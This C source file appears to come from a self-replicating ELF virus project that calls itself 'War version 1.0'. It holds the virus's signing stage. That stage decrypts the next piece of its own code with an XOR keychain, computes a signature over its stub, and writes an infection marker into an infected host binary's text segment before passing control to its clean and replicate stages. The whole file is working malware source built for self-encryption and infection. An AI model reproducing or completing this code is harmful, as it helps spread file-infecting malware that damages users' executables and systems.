#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline void generate_signature(unsigned char *signature)
{
	char *stub = (char *)L1;

	const size_t stub_size = (void *)__exit - (void *)L1;

	for (register size_t index = 0; index < stub_size; index++)
	{
		signature[index % SIGNATURE_SIZE] += stub[index];
	}
}

__attribute__((always_inline)) static inline void sign_infection(char *dst, const Elf64_Phdr *segment, const unsigned char *signature)
{
	const char beg[] = "War version 1.0 (c)oded by <jle-quel><ddinaut> - [";
	const char end[] = "]";
	const size_t size = _strlen(beg);

	dst += segment->p_offset + segment->p_filesz; 

	_memcpy(dst, beg, size);

	for (register size_t index = 0; index < SIGNATURE_SIZE; index++)
	{
		*(dst + (size + index)) = (signature[index] % 10) + 65;
	}

	_memcpy(dst + (size + SIGNATURE_SIZE), end, 1);
}

__attribute__((always_inline)) static inline void decrypt_right(const struct s_keychain *keychain, char *callee, const size_t size)
{
	for (register size_t index = 0; index < size; index++)
		callee[index] ^= keychain->key[RIGHT];
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void sign(struct s_host *host, struct s_keychain *keychain, enum e_context context, struct s_infect *infect)
{
#if LOGGER
	MID_LOGGER("key:\t\t\t");
#endif

	decrypt_right(keychain, (char *)stub, (void *)sign - (void *)stub);

	if (context == FAILURE)
		goto label;

	unsigned char signature[SIGNATURE_SIZE];

	generate_signature(signature);
	sign_infection(infect->ptr, host->segment[TEXT], signature);

label:
	update_keychain_right(keychain, (char *)sign, (void *)clean - (void *)sign);
	decrypt_right(keychain, (char *)clean, (void *)replicate - (void *)clean);

	clean(host, keychain, context, infect);
}
